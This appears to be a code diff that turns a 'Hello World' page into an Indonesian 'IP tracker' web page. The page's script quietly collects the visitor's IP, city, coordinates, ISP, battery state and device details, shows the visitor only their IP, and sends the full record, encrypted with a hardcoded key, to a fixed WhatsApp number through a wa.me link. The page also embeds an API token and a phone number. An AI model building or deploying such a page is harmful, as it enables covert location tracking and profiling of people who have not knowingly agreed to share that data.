@@ -1,9 +1,84 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Hello World</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pelacak IP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: #121212;
+            color: white;
+            padding: 20px;
+        }
+        .container {
+            background: #1E1E1E;
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+        }
+        button {
+            padding: 10px 20px;
+            margin: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .track-btn { background: green; color: white; }
+        .send-btn { background: blue; color: white; display: none; }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
 <body>
-    <h1>Hello, World!</h1>
+    <div class="container">
+        <h2>Pelacak IP</h2>
+        <button class="track-btn" onclick="startTracking()">Lacak Sekarang</button>
+        <div id="info"></div>
+        <button class="send-btn" onclick="sendToWhatsApp()">Kirimkan</button>
+    </div>
+
+    <script>
+        let trackingData = {};
+
+        async function startTracking() {
+            document.getElementById("info").innerHTML = "Melacak...";
+
+            // Dapatkan IP & Lokasi
+            let ipData = await fetch("https://ipinfo.io/json?token=6d8519218e7b69").then(res => res.json());
+
+            // Dapatkan Data Perangkat
+            let userAgent = navigator.userAgent;
+
+            // Dapatkan Status Baterai
+            navigator.getBattery().then(battery => {
+                trackingData = {
+                    ip: ipData.ip,
+                    kota: ipData.city,
+                    negara: ipData.country,
+                    koordinat: ipData.loc,
+                    provider: ipData.org,
+                    baterai: (battery.level * 100) + "%",
+                    pengisian: battery.charging ? "Sedang Mengisi" : "Tidak Mengisi",
+                    perangkat: userAgent
+                };
+
+                // Tampilkan hanya IP
+                document.getElementById("info").innerHTML = `<p><b>IP Publik:</b> ${trackingData.ip}</p>`;
+                document.querySelector(".send-btn").style.display = "inline-block";
+            });
+        }
+
+        function sendToWhatsApp() {
+            let dataString = JSON.stringify(trackingData);
+            let encryptedData = CryptoJS.AES.encrypt(dataString, "password123").toString();
+            
+            let waMessage = encodeURIComponent("🔒 Data Terenkripsi:\n" + encryptedData);
+            let waUrl = `https://wa.me/6287713740114?text=${waMessage}`;
+            window.open(waUrl, "_blank");
+        }
+    </script>
 </body>
-</html>
+    </html>
